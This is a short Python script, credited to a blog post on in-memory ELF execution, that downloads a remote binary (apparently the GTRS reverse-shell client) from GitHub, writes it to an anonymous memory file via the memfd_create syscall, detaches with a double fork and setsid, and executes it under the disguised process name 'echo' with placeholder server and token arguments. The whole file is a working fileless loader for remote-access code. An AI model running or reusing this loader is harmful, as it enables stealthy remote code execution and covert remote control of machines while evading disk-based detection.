#!/usr/bin/python

# This code came from this awesome blogpost, https://blog.fbkcs.ru/en/elf-in-memory-execution/

import os
import urllib
import ctypes

url = "https://github.com/mthbernardes/GTRS/releases/download/v1/client_Linux"
binary = urllib.urlopen(url).read()

fd = ctypes.CDLL(None).syscall(319,"",1)
final_fd = open('/proc/self/fd/'+str(fd),'wb')
final_fd.write(binary)
final_fd.close()

fork1 = os.fork() 
if 0 != fork1: os._exit(0)

ctypes.CDLL(None).syscall(112) 

fork2 = os.fork() 
if 0 != fork2: os._exit(0)

os.execl('/proc/self/fd/'+str(fd),'echo','youserver.ml','yourtokengoeshere') 

